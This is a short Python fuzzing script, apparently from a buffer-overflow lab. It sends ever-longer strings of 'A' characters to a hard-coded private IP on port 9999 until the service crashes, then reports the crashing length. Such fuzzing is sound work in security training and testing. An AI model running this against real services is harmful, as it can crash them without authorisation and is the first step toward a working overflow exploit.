#!/usr/bin/env python3

import socket
import time
import sys

def fuzz(ip, port, prefix="", timeout=1):
	string = prefix + "A" * 100
	while True:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.settimeout(timeout)
				s.connect((ip,port))
				s.recv(1024)
				print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
				s.send(bytes(string, "latin-1"))
				s.recv(1024)
		except Exception as e:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			sys.exit(0)
		string += 100 * "A"
		time.sleep(1)

if __name__ == "__main__":
	ip = "192.168.1.152"
	port = 9999
	prefix = ""
	timeout = 1
	fuzz(ip, port, prefix, timeout)

